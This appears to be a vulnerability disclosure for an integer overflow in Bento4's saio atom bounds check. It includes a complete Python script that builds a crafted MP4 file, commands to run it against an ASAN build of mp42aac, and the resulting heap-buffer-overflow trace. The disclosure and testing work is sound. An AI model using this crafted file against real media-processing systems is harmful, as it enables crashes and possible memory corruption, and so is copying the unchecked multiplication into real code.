## Bug0: AP4_SaioAtom integer overflow bypasses bounds check causing heap out-of-bounds read

In `AP4_SaioAtom::AP4_SaioAtom()` (Ap4SaioAtom.cpp), the bounds check `remains < entry_count * (version == 0 ? 4 : 8)` performs an unchecked 32-bit multiplication that wraps to zero when `version=1` and `entry_count=0x20000000`, allowing the check to be silently bypassed and triggering heap out-of-bounds reads in downstream atom parsers.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
import struct

def box(btype, data):
    return struct.pack('>I', 4 + 4 + len(data)) + btype + data

def full_box(btype, version, flags, data):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return box(btype, hdr + data)

# saio box: version=1, flags=0, entry_count=0x20000000
# 0x20000000 * 8 = 0x100000000, truncates to 0 in 32-bit -> bounds check bypassed
entry_count = 0x20000000
fake_offset = struct.pack('>Q', 0)  # 1 fake 64-bit offset (8 bytes)
saio_data = struct.pack('>I', entry_count) + fake_offset
saio = full_box(b'saio', 1, 0, saio_data)

# Minimal stsd, stts
stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 0))
stts = full_box(b'stts', 0, 0, struct.pack('>I', 0))
stbl = box(b'stbl', stsd + stts + saio)

url_entry = full_box(b'url ', 0, 1, b'')
dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + url_entry)
dinf = box(b'dinf', dref)
smhd = full_box(b'smhd', 0, 0, struct.pack('>HH', 0, 0))
minf = box(b'minf', smhd + dinf + stbl)

mdhd_data = struct.pack('>IIII', 0, 0, 44100, 0) + struct.pack('>HH', 0, 0)
mdhd = full_box(b'mdhd', 0, 0, mdhd_data)
hdlr_data = struct.pack('>I', 0) + b'soun' + b'\x00'*12 + b'SoundHandler\x00'
hdlr = full_box(b'hdlr', 0, 0, hdlr_data)
mdia = box(b'mdia', mdhd + hdlr + minf)

tkhd_data = struct.pack('>IIII', 0, 0, 1, 0)
tkhd_data += struct.pack('>II', 0, 0) + b'\x00'*8
tkhd_data += struct.pack('>HH', 0, 0) + struct.pack('>H', 0x0100) + b'\x00'*2
tkhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
tkhd_data += struct.pack('>II', 0, 0)
tkhd = full_box(b'tkhd', 0, 3, tkhd_data)
trak = box(b'trak', tkhd + mdia)

mvhd_data = struct.pack('>IIII', 0, 0, 1000, 0)
mvhd_data += struct.pack('>I', 0x00010000)
mvhd_data += struct.pack('>H', 0x0100) + b'\x00'*10
mvhd_data += struct.pack('>9i', 0x00010000,0,0,0,0x00010000,0,0,0,0x40000000)
mvhd_data += b'\x00'*24 + struct.pack('>I', 0xFFFFFFFF)
mvhd = full_box(b'mvhd', 0, 0, mvhd_data)
moov = box(b'moov', mvhd + trak)

ftyp = box(b'ftyp', b'mp42' + struct.pack('>I', 0) + b'mp42' + b'isom')

with open('poc_input.mp4', 'wb') as f:
    f.write(ftyp + moov)
print("Written poc_input.mp4")
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x5020000000f8 at pc 0x564a2bba8140 bp 0x7ffcece10870 sp 0x7ffcece10860
READ of size 1 at 0x5020000000f8 thread T0
    #0 0x564a2bba813f in AP4_CttsAtom::AP4_CttsAtom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xaa113f)
    #1 0x564a2bba9087 in AP4_CttsAtom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xaa2087)

### Impact

An attacker who supplies a crafted MP4 file with a `saio` box declaring `version=1` and `entry_count=0x20000000` can cause the 32-bit multiplication in the bounds check to wrap to zero, silently bypassing the guard and corrupting the stream reader position, which causes a subsequent sibling atom parser (`AP4_CttsAtom`) to perform a heap out-of-bounds read confirmed by AddressSanitizer. The attack surface is any invocation of mp42aac on an untrusted MP4 file, with no authentication or special privileges required. On 32-bit targets the overflow additionally enables out-of-bounds writes during loop-based entry population, raising the severity to potential heap corruption and remote code execution.
